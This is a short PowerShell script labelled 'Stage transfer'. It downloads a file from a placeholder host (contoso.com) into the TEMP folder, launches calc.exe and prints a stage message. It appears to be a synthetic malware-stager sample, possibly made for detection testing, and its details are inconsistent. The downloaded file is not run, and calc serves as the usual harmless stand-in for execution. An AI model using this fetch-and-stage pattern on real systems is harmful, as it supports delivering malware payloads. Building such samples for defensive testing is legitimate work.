
<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://contoso.com/stage1.ps1',
    [string]$WorkingPath = "$env:TEMP\stage2.bin",
    [int]$TimeoutSec = 162
)
Invoke-WebRequest -Uri $RemoteUrl -OutFile $WorkingPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Write-Output "stage 25 initialized"
$ProgressPreference = "SilentlyContinue"
